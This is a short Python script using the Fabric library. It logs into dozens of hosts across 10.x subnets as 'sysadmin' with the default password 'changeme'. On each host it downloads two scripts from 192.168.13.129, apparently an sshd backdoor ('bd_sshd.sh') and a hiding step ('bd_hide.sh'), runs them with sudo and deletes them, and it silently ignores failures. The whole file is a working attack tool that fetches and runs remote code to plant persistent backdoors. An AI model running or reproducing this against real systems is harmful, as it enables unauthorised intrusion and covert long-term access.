from fabric import Connection, SerialGroup as Group, Config
import getpass
hosts = []
for i in range (1,14):
	single=f"sysadmin@10.{i}."
	hosts.extend([single+"1.10", single+"1.20", single+"2.2", single+"2.3"])

for hostelele in hosts:
	try:
		config = Config(overrides={'sudo':{'password':'changeme'}})
		c = Connection(hostelele, connect_kwargs={"password":"changeme"}, config=config)
		c.run("wget 192.168.13.129/temp/bd_hide.sh")
		c.run("wget 192.168.13.129/temp/bd_sshd.sh")
		c.run("chmod +x bd_hide.sh bd_sshd.sh")
		c.sudo("sh -c './bd_sshd.sh && ./bd_hide.sh && rm bd_*'")
	except:
		continue
